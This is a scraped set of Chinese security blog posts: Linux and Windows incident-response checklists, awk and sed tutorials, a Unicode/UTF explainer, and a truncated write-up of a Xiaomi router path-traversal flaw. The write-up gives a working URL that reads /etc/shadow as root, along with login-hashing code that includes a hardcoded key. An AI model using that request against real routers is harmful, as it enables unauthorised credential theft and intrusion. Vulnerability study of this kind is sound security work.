https://nchc.dl.sourceforge.net/project/rkhunter/rkhunter/1.4.4/rkhunter-1.4.4.tar.gztar -zxvf rkhunter-1.4.4.tar.gzcd rkhunter-1.4.4./installer.sh --installrkhunter -c 2、病毒查杀 Clamav：http://www.clamav.net/download.html安装方式一： 1、安装 zlib：wget http://nchc.dl.sourceforge.net/project/libpng/zlib/1.2.7/zlib-1.2.7.tar.gz tar -zxvf zlib-1.2.7.tar.gzcd zlib-1.2.7#安装一下gcc编译环境： yum install gccCFLAGS=&quot;-O3 -fPIC&quot; ./configure --prefix= /usr/local/zlib/make &amp;&amp; make install2、添加用户组 clamav 和组成员 clamav：groupadd clamavuseradd -g clamav -s /bin/false -c &quot;Clam AntiVirus&quot; clamav3、安装 Clamavtar –zxvf clamav-0.97.6.tar.gzcd clamav-0.97.6./configure --prefix=/opt/clamav --disable-clamav -with-zlib=/usr/local/zlibmakemake install4、配置 Clamavmkdir /opt/clamav/logsmkdir /opt/clamav/updatatouch /opt/clamav/logs/freshclam.logtouch /opt/clamav/logs/clamd.logcd /opt/clamav/logschown clamav:clamav clamd.logchown clamav:clamav freshclam.log5、ClamAV 使用： /opt/clamav/bin/freshclam 升级病毒库./clamscan –h 查看相应的帮助信息./clamscan -r /home 扫描所有用户的主目录就使用./clamscan -r --bell -i /bin 扫描bin目录并且显示有问题的文件的扫描结果 安装方式二： #安装yum install -y clamav#更新病毒库freshclam#扫描方法clamscan -r /etc --max-dir-recursion=5 -l /root/etcclamav.logclamscan -r /bin --max-dir-recursion=5 -l /root/binclamav.logclamscan -r /usr --max-dir-recursion=5 -l /root/usrclamav.log#扫描并杀毒clamscan -r --remove /usr/bin/bsd-portclamscan -r --remove /usr/bin/clamscan -r --remove /usr/local/zabbix/sbin#查看日志发现cat /root/usrclamav.log |grep FOUND 3、webshell查杀Linux 版： 河马 WebShell 查杀：http://www.shellpub.com 4、RPM check 检查系统完整性可以通过rpm自带的-Va来校验检查所有的rpm软件包，查看哪些命令是否被替换了： ./rpm -Va &gt; rpm.log 如果一切均校验正常将不会产生任何输出，如果有不一致的地方，就会显示出来，输出格式是8位长字符串，每个字符都用以表示文件与RPM数据库中一种属性的比较结果 ，如果是. (点) 则表示测试通过。 验证内容中的8个信息的具体内容如下： S 文件大小是否改变 M 文件的类型或文件的权限（rwx）是否被改变 5 文件MD5校验是否改变（可以看成文件内容是否改变） D 设备中，从代码是否改变 L 文件路径是否改变 U 文件的属主（所有者）是否改变 G 文件的属组是否改变 T 文件的修改时间是否改变 如果命令被替换了，如果还原回来： 文件提取还原案例：rpm -qf /bin/ls 查询 ls 命令属于哪个软件包mv /bin/ls /tmp 先把 ls 转移到 tmp 目录下，造成 ls 命令丢失的假象rpm2cpio /mnt/cdrom/Packages/coreutils-8.4-19.el6.i686.rpm | cpio -idv ./bin/ls 提取 rpm 包中 ls 命令到当前目录的 /bin/ls 下cp /root/bin/ls /bin/ 把 ls 命令复制到 /bin/ 目录 修复文件丢失 5、Linux安全检查脚本Github 项目地址： https://github.com/grayddq/GScan https://github.com/ppabc/security_check https://github.com/T0xst/linux 尽信书不如无书，工具只是辅助，别太过于依赖，关键在于你如何解决问题的思路。 四、知识点补充1、awk命令AWK 是一种处理文本文件的语言，是一个强大的文本分析工具。 【语法】 awk [选项参数] &#x27;script&#x27; var=value file(s)或awk [选项参数] -f scriptfile var=value file(s) 【选项参数说明】 [+] -F fs or --field-separator fs指定输入文件折分隔符，fs是一个字符串或者是一个正则表达式，如-F:。[+] -v var=value or --asign var=value赋值一个用户定义变量。[+] -f scripfile or --file scriptfile从脚本文件中读取awk命令。[+] -mf nnn and -mr nnn对nnn值设置内在限制，-mf选项限制分配给nnn的最大块数目；-mr选项限制记录的最大数目。这两个功能是Bell实验室版awk的扩展功能，在标准awk中不适用。[+] -W compact or --compat, -W traditional or --traditional在兼容模式下运行awk。所以gawk的行为和标准的awk完全一样，所有的awk扩展都被忽略。[+] -W copyleft or --copyleft, -W copyright or --copyright打印简短的版权信息。[+] -W help or --help, -W usage or --usage打印全部awk选项和每个选项的简短说明。[+] -W lint or --lint打印不能向传统unix平台移植的结构的警告。[+] -W lint-old or --lint-old打印关于不能向传统unix平台移植的结构的警告。[+] -W posix打开兼容模式。但有以下限制，不识别：/x、函数关键字、func、换码序列以及当fs是一个空格时，将新行作为一个域分隔符；操作符**和**=不能代替^和^=；fflush无效。[+] -W re-interval or --re-inerval允许间隔正则表达式的使用，参考(grep中的Posix字符类)，如括号表达式[[:alpha:]]。[+] -W source program-text or --source program-text使用program-text作为源代码，可与-f命令混用。[+] -W version or --version打印bug报告信息的版本。 【基本用法】 log.txt文本内容如下： 2 this is a test3 Are you like awkThis&#x27;s a test10 There are orange,apple,mongo ​ 用法一： awk &#x27;&#123;[pattern] action&#125;&#x27; &#123;filenames&#125; # 行匹配语句 awk &#x27;&#x27; 只能用单引号 实例： # 每行按空格或TAB分割，输出文本中的1、4项 $ awk &#x27;&#123;print $1,$4&#125;&#x27; log.txt --------------------------------------------- 2 a 3 like This&#x27;s 10 orange,apple,mongo # 格式化输出 $ awk &#x27;&#123;printf &quot;%-8s %-10s\\n&quot;,$1,$4&#125;&#x27; log.txt --------------------------------------------- 2 a 3 like This&#x27;s 10 orange,apple,mongo 用法二： awk -F #-F相当于内置变量FS, 指定分割字符# 使用&quot;,&quot;分割 $ awk -F, &#x27;&#123;print $1,$2&#125;&#x27; log.txt --------------------------------------------- 2 this is a test 3 Are you like awk This&#x27;s a test 10 There are orange apple # 或者使用内建变量 $ awk &#x27;BEGIN&#123;FS=&quot;,&quot;&#125; &#123;print $1,$2&#125;&#x27; log.txt --------------------------------------------- 2 this is a test 3 Are you like awk This&#x27;s a test 10 There are orange apple # 使用多个分隔符.先使用空格分割，然后对分割结果再使用&quot;,&quot;分割 $ awk -F &#x27;[ ,]&#x27; &#x27;&#123;print $1,$2,$5&#125;&#x27; log.txt --------------------------------------------- 2 this test 3 Are awk This&#x27;s a 10 There apple 2、sed命令Linux sed 命令是利用脚本来处理文本文件。 sed 可依照脚本的指令来处理、编辑文本文件。 Sed 主要用来自动编辑一个或多个文件、简化对文件的反复操作、编写转换程序等。 【语法】 sed [-hnV][-e&lt;script&gt;][-f&lt;script文件&gt;][文本文件] 【参数说明】 [+] -e&lt;script&gt;或--expression=&lt;script&gt; 以选项中指定的script来处理输入的文本文件。[+] -f&lt;script文件&gt;或--file=&lt;script文件&gt; 以选项中指定的script文件来处理输入的文本文件。[+] -h或--help 显示帮助。[+] -n或--quiet或--silent 仅显示script处理后的结果。[+] -V或--version 显示版本信息。 【动作说明】 a ：新增， a 的后面可以接字串，而这些字串会在新的一行出现(目前的下一行)～c ：取代， c 的后面可以接字串，这些字串可以取代 n1,n2 之间的行！d ：删除，因为是删除啊，所以 d 后面通常不接任何东东；i ：插入， i 的后面可以接字串，而这些字串会在新的一行出现(目前的上一行)；p ：打印，亦即将某个选择的数据印出。通常 p 会与参数 sed -n 一起运行～s ：取代，可以直接进行取代的工作哩！通常这个 s 的动作可以搭配正规表示法！例如 1,20s/old/new/g 就是啦！ 【实例】 在testfile文件的第四行后添加一行，并将结果输出到标准输出，在命令行提示符下输入如下命令： sed -e 4a\\newLine testfile 首先查看testfile中的内容如下： $ cat testfile #查看testfile 中的内容 HELLO LINUX! Linux is a free unix-type opterating system. This is a linux testfile! Linux test 使用sed命令后，输出结果如下： $ sed -e 4a\\newline testfile #使用sed 在第四行后添加新字符串 HELLO LINUX! #testfile文件原有的内容 Linux is a free unix-type opterating system. This is a linux testfile! Linux test newline 【以行为单位的新增/删除】 将 /etc/passwd 的内容列出并且列印行号，同时，请将第 2~5 行删除！ [root@www ~]# nl /etc/passwd | sed &#x27;2,5d&#x27;1 root:x:0:0:root:/root:/bin/bash6 sync:x:5:0:sync:/sbin:/bin/sync7 shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown.....(后面省略)..... sed 的动作为 ‘2,5d’ ，那个 d 就是删除！因为 2-5 行给他删除了，所以显示的数据就没有 2-5 行罗～ 另外，注意一下，原本应该是要下达 sed -e 才对，没有 -e 也行啦！同时也要注意的是， sed 后面接的动作，请务必以 ‘’ 两个单引号括住喔！ 只要删除第 2 行 nl /etc/passwd | sed &#x27;2d&#x27; 要删除第 3 到最后一行 nl /etc/passwd | sed &#x27;3,$d&#x27; 在第二行后(亦即是加在第三行)加上『drink tea?』字样！ nl /etc/passwd | sed &#x27;2i drink tea&#x27; 如果是要增加两行以上，在第二行后面加入两行字，例如 **Drink tea or .....** 与 **drink beer?** [root@www ~]# nl /etc/passwd | sed &#x27;2a Drink tea or ......\\&gt; drink beer ?&#x27;1 root:x:0:0:root:/root:/bin/bash2 bin:x:1:1:bin:/bin:/sbin/nologinDrink tea or ......drink beer ?3 daemon:x:2:2:daemon:/sbin:/sbin/nologin.....(后面省略)..... 每一行之间都必须要以反斜杠『 \\ 』来进行新行的添加喔！所以，上面的例子中，我们可以发现在第一行的最后面就有 \\ 存在。 【以行为单位的替换与显示】 将第2-5行的内容取代成为『No 2-5 number』呢？ [root@www ~]# nl /etc/passwd | sed &#x27;2,5c No 2-5 number&#x27;1 root:x:0:0:root:/root:/bin/bashNo 2-5 number6 sync:x:5:0:sync:/sbin:/bin/sync.....(后面省略)..... 透过这个方法我们就能够将数据整行取代了！ 仅列出 /etc/passwd 文件内的第 5-7 行 [root@www ~]# nl /etc/passwd | sed -n &#x27;5,7p&#x27;5 lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin6 sync:x:5:0:sync:/sbin:/bin/sync7 shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown 可以透过这个 sed 的以行为单位的显示功能， 就能够将某一个文件内的某些行号选择出来显示。 【数据的搜寻并显示】 搜索 /etc/passwd有root关键字的行 nl /etc/passwd | sed &#x27;/root/p&#x27;1 root:x:0:0:root:/root:/bin/bash1 root:x:0:0:root:/root:/bin/bash2 daemon:x:1:1:daemon:/usr/sbin:/bin/sh3 bin:x:2:2:bin:/bin:/bin/sh4 sys:x:3:3:sys:/dev:/bin/sh5 sync:x:4:65534:sync:/bin:/bin/sync....下面忽略 如果root找到，除了输出所有行，还会输出匹配行。 使用-n的时候将只打印包含模板的行。 nl /etc/passwd | sed -n &#x27;/root/p&#x27;1 root:x:0:0:root:/root:/bin/bash 【数据的搜寻并删除】 删除/etc/passwd所有包含root的行，其他行输出 nl /etc/passwd | sed &#x27;/root/d&#x27;2 daemon:x:1:1:daemon:/usr/sbin:/bin/sh3 bin:x:2:2:bin:/bin:/bin/sh....下面忽略#第一行的匹配root已经删除了 【数据的搜寻并执行命令】 搜索/etc/passwd，找到root对应的行，执行后面花括号中的一组命令，每个命令之间用分号分隔，这里把bash替换为blueshell，再输出这行： nl /etc/passwd | sed -n &#x27;/root/&#123;s/bash/blueshell/;p;q&#125;&#x27; 1 root:x:0:0:root:/root:/bin/blueshell 最后的q是退出。 【数据的搜寻并替换】 除了整行的处理模式之外， sed 还可以用行为单位进行部分数据的搜寻并取代。基本上 sed 的搜寻与替代的与 vi 相当的类似！他有点像这样： sed &#x27;s/要被取代的字串/新的字串/g&#x27; 先观察原始信息，利用 /sbin/ifconfig 查询 IP [root@www ~]# /sbin/ifconfig eth0eth0 Link encap:Ethernet HWaddr 00:90:CC:A6:34:84inet addr:192.168.1.100 Bcast:192.168.1.255 Mask:255.255.255.0inet6 addr: fe80::290:ccff:fea6:3484/64 Scope:LinkUP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1.....(以下省略)..... 本机的ip是192.168.1.100。 将 IP 前面的部分予以删除 [root@www ~]# /sbin/ifconfig eth0 | grep &#x27;inet addr&#x27; | sed &#x27;s/^.*addr://g&#x27;192.168.1.100 Bcast:192.168.1.255 Mask:255.255.255.0 接下来则是删除后续的部分，亦即： 192.168.1.100 Bcast:192.168.1.255 Mask:255.255.255.0 将 IP 后面的部分予以删除 [root@www ~]# /sbin/ifconfig eth0 | grep &#x27;inet addr&#x27; | sed &#x27;s/^.*addr://g&#x27; | sed &#x27;s/Bcast.*$//g&#x27;192.168.1.100 【多点编辑】 一条sed命令，删除/etc/passwd第三行到末尾的数据，并把bash替换为blueshell nl /etc/passwd | sed -e &#x27;3,$d&#x27; -e &#x27;s/bash/blueshell/&#x27;1 root:x:0:0:root:/root:/bin/blueshell2 daemon:x:1:1:daemon:/usr/sbin:/bin/sh -e表示多点编辑，第一个编辑命令删除/etc/passwd第三行到末尾的数据，第二条命令搜索bash替换为blueshell。","categories":[{"name":"应急响应","slug":"应急响应","permalink":"https://wolke.cn/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"}],"tags":[{"name":"应急响应","slug":"应急响应","permalink":"https://wolke.cn/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"}],"author":"w01ke"},{"title":"Windows入侵排查","slug":"Windows入侵排查","date":"2022-03-28T11:55:03.000Z","updated":"2022-03-28T15:49:48.253Z","comments":true,"path":"post/fbbd4eb4.html","link":"","permalink":"https://wolke.cn/post/fbbd4eb4.html","excerpt":"","text":"一、前言1、什么是应急响应“应急响应”对应的英文是“Incident Response”或“Emergency Response”等，通常是指一个组织为了应对各种意外事件的发生所做的准备以及在事件发生后所采取的措施。（百度） 2、常见攻击类型（1）WEB入侵：挂马，网页篡改，植入webshell，黑页，暗链等 （2）主机入侵：病毒木马，勒索病毒，远控后门，系统异常，RDP爆破，SSH爆破，主机漏洞，数据库入侵等 （3）网络攻击：DDOS/CC攻击，ARP攻击，DNS/HTTP劫持 （4）路由器/交换机攻击：内网病毒，配置错误，机器本身的漏洞等 二、Windows入侵排查思路1、检查系统账号安全（1）查看服务器是否有弱口令，远程管理端口是否对公网开放 &emsp;&emsp;据实际情况咨询相关服务器管理员。 （2）查看服务器是否存在可疑账号、新增账号。 黑客获得shell后，通常会新建一个用户用来登陆远程桌面。我们可以在命令行中输入net user查看当前计算机等等用户有无增加 在运行中输入mmc打开控制台，选择文件-&gt;添加/删除管理单元-&gt;本地用户和组。（也可以在cmd 窗口，输入 lusrmgr.msc 命令） （3）查看服务器是否存在隐藏账号、克隆账号。 打开注册表 ，查看管理员对应键值。 使用D盾_web查杀工具，集成了对克隆账号检测的功能。 （4）结合日志，查看管理员登录时间、用户名是否存在异常。 Win+R 打开运行，输入”eventvwr.msc“，回车运行，打开“事件查看器”。 导出 Windows 日志 – 安全，利用微软官方工具 Log Parser 进行分析 2、检查网络状态、进程（1）检查端口连接情况，是否有远程连接、可疑连接。 使用netstat -ano命令查看目前的网络连接，定位可疑的 ESTABLISHED 根据 netstat 命令定位出的 PID 编号，再通过 tasklist 命令进行进程定位 tasklist | findstr &quot;PID&quot; （2）查看hosts文件是否被修改，hosts文件的存放位置为C:\\Windows\\System32\\drivers\\etc （3）进程 开始 – 运行 – 输入 msinfo32 命令，依次点击 “软件环境 – 正在运行任务” 就可以查看到进程的详细信息，比如进程路径、进程ID、文件创建日期以及启动时间等。 打开D盾_web查杀工具，进程查看，关注没有签名信息的进程。 通过微软官方提供的 Process Explorer 等工具进行排查 。 查看可疑的进程及其子进程。可以通过观察以下内容： 没有签名验证信息的进程没有描述信息的进程进程的属主进程的路径是否合法CPU 或内存资源占用长时间过高的进程 小技巧 查看端口对应的 PID：netstat -ano | findstr &quot;port&quot; 查看进程对应的 PID：任务管理器 – 查看 – 选择列 – PID 或者 tasklist | findstr &quot;PID&quot; 查看进程对应的程序位置：任务管理器 – 选择对应进程 – 右键打开文件位置；或者运行输入 wmic，cmd 界面输入 process tasklist /svc 进程 – PID – 服务 查看Windows服务所对应的端口：%systemroot%/system32/drivers/etc/services（一般 %systemroot% 就是 C:\\Windows 路径） 3、检查启动项、计划任务、服务（1）检查启动项 登录服务器，单击【开始】&gt;【所有程序】&gt;【启动】，默认情况下此目录在是一个空目录，确认是否有非业务程序在该目录下。 单击开始菜单 &gt;【运行】，输入 msconfig，查看是否存在命名异常的启动项目，是则取消勾选命名异常的启动项目，并到命令中显示的路径删除文件。Windows7上可以直接在这里看到开机的启动项，而现在Windows10需要在任务管理器中查看 单击【开始】&gt;【运行】，输入 regedit，打开注册表，查看开机启动项是否正常，特别注意如下三个注册表项。 检查右侧是否有启动异常的项目，如有请删除，并建议安装杀毒软件进行病毒查杀，清除残留病毒或木马。 HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\runHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Runonce 利用安全软件查看启动项、开机时间管理等。 组策略，运行 gpedit.msc （2）检查计划任务 单击【开始】&gt;【设置】&gt;【控制面板】&gt;【任务计划】，查看计划任务属性，便可以发现木马文件的路径。 单击【开始】&gt;【运行】；输入 cmd，然后输入 at，检查计算机与网络上的其它计算机之间的会话或计划任务，如有，则确认是否为正常连接。 （3）检查服务单击【开始】&gt;【运行】，输入 services.msc，注意服务状态和启动类型，检查是否有异常服务。通常病毒都会藏着这里，并伪装名字 4、查找可疑目录及文件 查看用户目录，新建账号会在这个目录生成一个用户目录，查看是否有新建用户目录。 Window 2003版本 C:\\Documents and SettingsWindow 2008R2及以后版本 C:\\Users\\ 一般带有tmp/temp的都是存放临时文件的地方，也是一般病毒存在的地方。在运行输入%temp%查看临时文件，输入 %UserProfile%\\Recent查看最近打开的文件 在服务器各个目录，可根据文件夹内文件列表时间进行排序，查找可疑文件。 回收站、浏览器下载目录、浏览器历史记录 修改时间在创建时间之前的为可疑文件 5、漏洞与系统补丁有的黑客入侵后会故意卸载一些漏洞与系统补丁，来达到利用漏洞来进行持续控制的目的。在cmd中输入systeminfo即可查看计算机安装的补丁 6、发现并得到 WebShell、远控木马的创建时间，如何找出同一时间范围内创建的文件？ 利用 Registry Workshop 注册表编辑器的搜索功能，可以找到最后写入时间区间的文件。 利用计算机自带文件搜索功能，指定修改时间进行搜索。 7、日志分析日志会记录计算机的所有行为，所以黑客的行为会被记录在日志中，我们可以通过检查日志来查看自己的计算机是否正常。 （1）系统日志 前提：开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。 打开运行输入eventvwr.msc即可查看日志。通过查看事件id来排查相关的操作行为 1102 清理审计日志4624 账号成功登录4625 账号登录失败4672 授予特殊权限4720 创建用户4726 删除用户4728 将成员添加到启用安全的全局组中4729 将成员从安全的全局组中移除4732 将成员添加到启用安全的本地组中4733 将成员从启用安全的本地组中移除4756 将成员添加到启用安全的通用组中4757 将成员从启用安全的通用组中移除4719 系统审计策略修改4768 Kerberos身份验证（TGT请求）4769 Kerberos服务票证请求4776 NTLM身份验证 日志是可以清除的，但清除日志这一行为同样会被记录下来，所以检查日志就可以确认你的计算机在一段时间内是否正常。最好就是备份日志 导出应用程序日志、安全日志、系统日志，利用 Log Parser 进行分析。 （2）Web访问日志 找到中间件的web日志，打包到本地方便进行分析。 推荐工具：Windows 下，推荐用 EmEditor 进行日志分析，支持大文本，搜索效率还不错。Linux 下，使用 Shell 命令组合查询分析。 三、工具篇1、病毒分析 PCHunter：http://www.xuetr.com 火绒剑：https://www.huorong.cn Process Explorer：https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer processhacker：https://processhacker.sourceforge.io/downloads.php autoruns：https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns OTL：https://www.bleepingcomputer.com/download/otl/ SysInspector：http://download.eset.com.cn/download/detail/?product=sysinspector 2、病毒查杀 卡巴斯基：http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe （推荐理由：绿色版、最新病毒库） 大蜘蛛：http://free.drweb.ru/download+cureit+free（推荐理由：扫描快、一次下载只能用1周，更新病毒库） 火绒安全软件：https://www.huorong.cn 360杀毒：http://sd.360.cn/download_center.html 3、病毒动态 CVERC-国家计算机病毒应急处理中心：http://www.cverc.org.cn 微步在线威胁情报社区：https://x.threatbook.cn 火绒安全论坛：http://bbs.huorong.cn/forum-59-1.html 爱毒霸社区：http://bbs.duba.net 腾讯电脑管家：http://bbs.guanjia.qq.com/forum-2-1.html 4、在线病毒扫描网站 Virustotal：https://www.virustotal.com Virscan：http://www.virscan.org 腾讯哈勃分析系统：https://habo.qq.com Jotti 恶意软件扫描系统：https://virusscan.jotti.org 5、webshell查杀 D盾_Web查杀：http://www.d99net.net/index.asp 河马 WebShell 查杀：http://www.shellpub.com","categories":[{"name":"应急响应","slug":"应急响应","permalink":"https://wolke.cn/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"}],"tags":[{"name":"应急响应","slug":"应急响应","permalink":"https://wolke.cn/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"}],"author":"w01ke"},{"title":"浅析字符编码--Unicode与UTF","slug":"浅析字符编码-Unicode与UTF","date":"2022-03-27T18:32:44.000Z","updated":"2022-03-27T18:52:42.986Z","comments":true,"path":"post/b9fef7af.html","link":"","permalink":"https://wolke.cn/post/b9fef7af.html","excerpt":"","text":"一、原始的ASCII编码以下是原始的ASCII编码对应关系图表 可以来一个小实验：打开记事本，编辑AB，另存为格式为ANSI的ASCII.txt文件 使用UE查看十六进制，就会发现的确是AB对应的十六进制数41 42，其中左侧的00000000h是这两个字符的相对偏移 二、ASCII的拓展：GB2312或GB2312-801个字节，最多也就能表示[0，255]总共256个字符，而像汉字，日文，韩文等等，这些在ASCII码表中都没有表示方法所以就必须要创建新的编码 于是GB2312和GB2312-80诞生了，思路就是：既然ASCII码的扩展表字符不常用，那就针对扩展的ASCII码，把两个扩展的ASCII码字节拼在一起，变成一个新的汉字。比如C4 E3就是你，BA C3就是好 但是这种编码方式有个很严重的问题，每个国家都有每个国家的编码，比如发送一篇编码方式为GB2312，内容为你好，的邮件给新加坡，而新加坡用的是big5编码，也是用两个拓展ASCII的字节拼成一个新的字，但它用big5拼出来肯定不是你好二字，是乱码！ 三、Unicode编码1、什么是Unicode？这是一个编码方案，说白了就是一张包含全世界所有文字的一张编码表，只要是这个世界上存在的文字符号，统统给你一个唯一的编码。 Unicode编码范围是：0x000000——0x10FFFF，可以容纳100多万个符号！ 2、Unicode的问题Unicode只是一个符号集，它只规定了符号的二进制代码，却没有规定这个二进制代码应该如何存储 假设中是：1234，那么就是12 34这样存储，占两个字节；国是12345，那到底该怎么存储，01 23 45还是12 34 50又或者是其他方式呢？不得而知 3、如何存储Unicode：UTF-16/UTF-8UTF-16/UTF-8是Unicode的实现方式 （1）UTF-16（Unicode的默认存储方式）UTF-16编码以16位无符号整数为单位，注意是16位为一个单位，不表示一个字符就只有16位。这个要看字符的Unicode编码处于什么范围而定，有可能是2个字节，也有可能是4个字节。 没有满两个字节的就补全到两个字节，满两个字节的就补全到四个字节，以此类推。 现在机器上的Unicode编码一般指的就是UTF-16。 做个小实验，文本文件Unicode.txt的内容为A中且用Unicode编码，用UE打开该文件，查看十六进制。计算机中默认是小端存储，首先前两2个字节0xFEFF先别管（后续会说），0x0041是A，0x4E2D是中，没问题 但这样就会有个问题，A用0x41一个字节就可以存储，用两个字节存储0x0041造成了资源浪费，这在本地存储还没什么，顶多费点硬盘；主要是在网络传输中，本来4k能传完的东西要传8k，浪费了带宽，于是便诞生了UTF-8来解决这个问题，而UTF-8也正是在网络传输问题上火起来了 UTF-32即是以四个字节为单位，更暴力了 （2）UTF-8UTF-8是一种变长的存储方案，顾名思义，1个字节能存储的就用1个字节，2个字节能存储的就用2个字节…….，优点就是节省空间，缺点就是解析困难 UTF-8的编码规则很简单，只有二条： 1）对于单字节的符号，字节的第一位设为0，后面7位为这个符号的unicode码。因此对于英语字母，UTF-8编码和ASCII码是相同的。 2）对于n字节的符号（n&gt;1），第一个字节的前n位都设为1，第n+1位设为0，后面字节的前两位一律设为10。剩下的没有提及的二进制位，全部为这个符号的unicode码。 分类 Unicode编码（16进制） UTF-8字节流（二进制） 特点 1 0000 0000 - 0000 007F 0xxxxxx 是咋样就咋样 2 0000 0080 - 0000 07FF 110xxxxx 10xxxxxx 一分为二 3 0000 0800 - 0000 FFFF 1110xxxx 10xxxxxx 10xxxxxx 一分为三 4 0001 0000 - 0010 FFFF 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx 一分为四 举个例子，由上面的实验可知以下信息 A中--&gt;Unicode编码：0x0041 0x4E2D 现在将A中进行UTF-8编码，结果如下图：前面的三个字节0xBFBBEF先不用管，后面是41 E4 B8 AD 为什么会这样呢？看下面的分析 首先是已知信息A中--&gt;UTF-16编码：0x0041 0x4E2DA中--&gt;UTF-8编码： 0x41 0xE4B8AD（UTF-8以大端存储）我们从已知信息来分析为什么会产生这样的结果[+] A的UTF-16编码的结果为0x0041，在上表中第一种情况的区间内，因此是咋样就咋样，UTF16的A转换为UTF-8的A保持不变[+] 中的UTF-16编码的结果为0x4E2D，在上表中第三种情况的区间内，因此按照以下规则一分为三： [---] 0x4E2D的二进制是0100 1110 0010 1101，将得到的二进制数据依次填充到1110xxxx 10xxxxxx 10xxxxxx中就是1110(0100) 10(111000) 10(101101)，即E4 B8 AD，即0xE4B8AD [---] 同样的，反向分析的话，0xE4B8AD二进制为1110(0100) 10(111000) 10(101101)，以四位即十六进制提取出来即0100 1110 0010 1101，即4E 2D，即0x4E2D 因此可以得出一个一般性的结论：当网络传输文件的时候，数字字母符号比较多，就用UTF-8更节省资源，如果汉字比较多，用UTF-8节省不了多少资源，使用UTF-16即可 （3）BOM（Byte Order Mark）如果接收到了一个文件，我们怎么知道是用UTF-8还是用UTF-16解析呢？这就有了字节序标记来解决这个问题 编码 数据流 大小端 UTF-8 EF BB BF 大端存储 UTF-16 LE（little endian） FF FE 小端存储 UTF-16 BE（big endian） FE FF 大端存储 为什么UTF-16需要区分大端小端，而UTF-8不用呢？ 对UTF-16来说，因为是以两个字节为单位，两个字节正着放，和反着放，会对应两个不同字上面去。 对UTF-8来说，由于UTF-8的设计，一个字符对应的各个字节，是能够区分出哪个是数据高位、哪个数据低位的，所以不需要。上表中，第一个字节就属于是数据高位。 不管是内存、还是文件，程序总是从低地址读到高地址，而由于第一个字节的开头可以指示出这个字符还剩余几个字节需要读取，所以UTF-8必须把可以指示剩余字节数的那个字节放到低地址，其余字节依次放到高地址。 四、大小端存储方式计算机默认是小端存储 小端存储：是指数据的高字节保存在内存的高地址中，而数据的低字节保存在内存的低地址中，这种存储模式将地址的高低和数据位权有效地结合起来，高地址部分权值高，低地址部分权值低，和我们的逻辑方法一致。 大端存储：是指数据的高字节保存在内存的低地址中，而数据的低字节保存在内存的高地址中，这样的存储模式有点儿类似于把数据当作字符串顺序处理：地址由小向大增加，而数据从高位往低位放。（大端模式是我们直观上的认为的模式） 如果将一个32位的整数0x12345678存放到一个整型变量（int）中，这个整型变量采用大端或者小端模式在内存中的存储由下表所示。 为简单起见，本文使用OP0表示一个32位数据的最高字节MSB（Most Significant Byte），使用OP3表示一个32位数据最低字节LSB（Least Significant Byte）。 小端：较高的有效字节存放在较高的存储器地址，较低的有效字节存放在较低的存储器地址。大端：较高的有效字节存放在较低的存储器地址，较低的有效字节存放在较高的存储器地址。 测试代码 #include &lt;stdio.h&gt;void main() &#123; int i = 0x12345678; char* pc = (char*)&amp;i; if (*pc == 0x12) &#123; printf(&quot;Big Endian\\n&quot;); &#125; else if (*pc == 0x78) &#123; printf(&quot;Little Endian\\n&quot;); &#125; &#125;","categories":[{"name":"二进制","slug":"二进制","permalink":"https://wolke.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"https://wolke.cn/tags/%E9%80%86%E5%90%91/"}],"author":"w01ke"},{"title":"小米路由器远程命令执行漏洞(CVE-2019-18370，CVE-2019-18371)","slug":"小米路由器远程命令执行漏洞-CVE-2019-18370，CVE-2019-18371","date":"2022-03-14T09:02:54.000Z","updated":"2022-03-14T09:10:59.295Z","comments":true,"path":"post/83737637.html","link":"","permalink":"https://wolke.cn/post/83737637.html","excerpt":"","text":"一、远程任意文件读取漏洞（CVE-2019-18371）1、漏洞产生原理小米路由器的nginx配置文件错误，导致目录穿越漏洞，实现任意文件读取（无需登录） nginx配置不当可导致目录穿越漏洞 location /xxx &#123; alias /abc/;&#125; 可通过访问http://domain.cn/xxx../etc/passwd实现目录穿越访问上级目录及其子目录文件。 在小米路由器的文件/etc/sysapihttpd/sysapihttpd.conf中，存在 location /api-third-party/download/extdisks &#123; alias /extdisks/;&#125; 故可以任意文件读取根目录下的所有文件，而且是root权限，如访问http://192.168.31.1/api-third-party/download/extdisks../etc/shadow 类似的问题，存在多处如 location /backup/log &#123; alias /tmp/syslogbackup/;&#125;location /api-third-party/download/public &#123; alias /userdisk/data/;&#125;location /api-third-party/download/private &#123; alias /userdisk/appdata/;&#125; 2、漏洞利用通过任意文件读取，登录路由器后台 不是明文存储密码，进行一定分析。关注两个过程，一是登录时前端js生成http post请求参数过程，二是验证用户登陆的后端过程。 （1）登录时前端js生成HTTP POST请求参数过程 var Encrypt = &#123; key: &#x27;a2ffa5c9be07488bbb04a3a47d3c5f6a&#x27;, iv: &#x27;64175472480004614961023454661220&#x27;, nonce: null, init: function()&#123; var nonce = this.nonceCreat(); this.nonce = nonce; return this.nonce; &#125;, nonceCreat: function()&#123; var type = 0; // 自己的mac地址 var deviceId = &#x27;&lt;%=mac%&gt;&#x27;; var time = Math.floor(new Date().getTime() / 1000); var random = Math.floor(Math.random() * 10000); return [type, deviceId, time, random].join(&#x27;_&#x27;); &#125;, oldPwd : function(pwd)&#123; // oldPwd = sha1(nonce + sha1(pwd + &#x27;a2ffa5c9be07488bbb04a3a47d3c5f6a&#x27;)) return CryptoJS.SHA1(this.nonce + CryptoJS.SHA1(pwd + this.key).toString()).toString(); &#125;, 